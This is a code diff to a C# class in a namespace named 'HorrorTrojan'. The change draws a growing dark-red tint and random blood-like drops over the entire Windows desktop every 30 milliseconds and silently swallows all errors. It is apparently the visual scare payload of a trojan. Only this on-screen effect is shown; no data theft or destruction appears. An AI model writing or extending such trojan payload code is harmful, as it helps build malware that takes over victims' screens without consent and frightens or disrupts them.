@@ -15,6 +15,7 @@ namespace HorrorTrojan
         private int screenWidth;
         private int screenHeight;
         private object lockObject = new object();
+        private int redAlpha = 0;
         
         public GDIOverlay()
         {
@@ -44,6 +45,7 @@ namespace HorrorTrojan
             {
                 elapsedSeconds++;
                 dropCount = Math.Min(elapsedSeconds / 2, 60);
+                redAlpha = Math.Min(50, elapsedSeconds / 3);
             }
         }
         
@@ -53,14 +55,14 @@ namespace HorrorTrojan
             {
                 try
                 {
-                    DrawDrops();
+                    DrawOverlay();
                     Thread.Sleep(30);
                 }
                 catch { }
             }
         }
         
-        private void DrawDrops()
+        private void DrawOverlay()
         {
             IntPtr desktopDC = NativeMethods.GetDC(IntPtr.Zero);
             if (desktopDC == IntPtr.Zero) return;
@@ -70,26 +72,34 @@ namespace HorrorTrojan
                 using (Graphics g = Graphics.FromHdc(desktopDC))
                 {
                     int count;
+                    int alpha;
                     lock (lockObject)
                     {
                         count = dropCount;
+                        alpha = redAlpha;
                     }
                     
-                    if (count < 3) return;
-                    
-                    for (int i = 0; i < count; i++)
+                    using (SolidBrush bgBrush = new SolidBrush(Color.FromArgb(alpha, 40, 0, 0)))
                     {
-                        int x = rnd.Next(0, screenWidth);
-                        int y = rnd.Next(0, screenHeight);
-                        int size = rnd.Next(2, 10);
-                        int alpha = rnd.Next(120, 220);
-                        
-                        using (SolidBrush brush = new SolidBrush(Color.FromArgb(alpha, 180, 0, 0)))
+                        g.FillRectangle(bgBrush, 0, 0, screenWidth, screenHeight);
+                    }
+                    
+                    if (count >= 3)
+                    {
+                        for (int i = 0; i < count; i++)
                         {
-                            if (rnd.Next(0, 2) == 0)
-                                g.FillEllipse(brush, x, y, size, size * 2);
-                            else
-                                g.FillEllipse(brush, x, y, size, size);
+                            int x = rnd.Next(0, screenWidth);
+                            int y = rnd.Next(0, screenHeight);
+                            int size = rnd.Next(2, 10);
+                            int dropAlpha = rnd.Next(120, 220);
+                            
+                            using (SolidBrush brush = new SolidBrush(Color.FromArgb(dropAlpha, 180, 0, 0)))
+                            {
+                                if (rnd.Next(0, 2) == 0)
+                                    g.FillEllipse(brush, x, y, size, size * 2);
+                                else
+                                    g.FillEllipse(brush, x, y, size, size);
+                            }
                         }
                     }
                 }
